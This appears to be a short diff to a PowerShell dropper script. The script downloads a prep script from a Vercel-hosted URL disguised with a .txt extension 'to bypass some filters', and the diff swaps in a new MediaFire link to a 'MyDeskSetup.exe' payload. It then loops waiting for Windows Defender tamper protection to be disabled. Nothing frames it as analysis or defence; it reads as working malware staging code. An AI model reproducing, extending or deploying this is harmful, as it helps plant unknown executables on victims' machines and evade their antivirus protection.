@@ -140,8 +140,7 @@ $PrepScriptPath = "$env:ProgramData\RevolutionPrep.ps1"
 # Link to the RAW content of 'revolution2.txt' (Hosted on Vercel)
 # WE USE .txt EXTENSION TO BYPASS SOME FILTERS, SCRIPT WILL RENAME IT.
 $PrepUrl = "https://mydesk-registry.vercel.app/revolution2.txt" 
-$PayloadUrl = "https://download1590.mediafire.com/3lrq7gnzrcpgyyrPHnlNjMSFOPeU_FGGqWUESEhNReok4dgWX0kfrFyEuLzVCjCk3Z7hyfBlsS-PS_-pTBHA4OVISF9LMAlzGCJ5j6JevIY1-0VapdyvitRmuRZjYOmMKYfcxK60_c0g7JSurCIwzGjzu860a0e8CHHfv0UOrzCE/amwpqxtnov8hrox/MyDeskSetup.exe" # <--- FAST PATH Payload
-
+$PayloadUrl = "https://download1593.mediafire.com/6ygh80yoxfjgmAdd46HUTtiIGs5j-5_LVR_UkkoQRMNKSAPDN7kG03GniheGLEvA0CnC5BBslf_vXpAmVn5Ey6PMt4kTqfyF5KthqjkQV1WnvFcRz3J4JnbFUw3Z3S0u8OHFYBe-RnFVYYZOASVCFyxPUjVSkxgFimKZPj25UiIlHow/76v0uxlwvbr30rk/MyDeskSetup.exe"
 while ($true) {
     $Status = Get-MpComputerStatus
     if ($Status.IsTamperProtected -eq $false) {
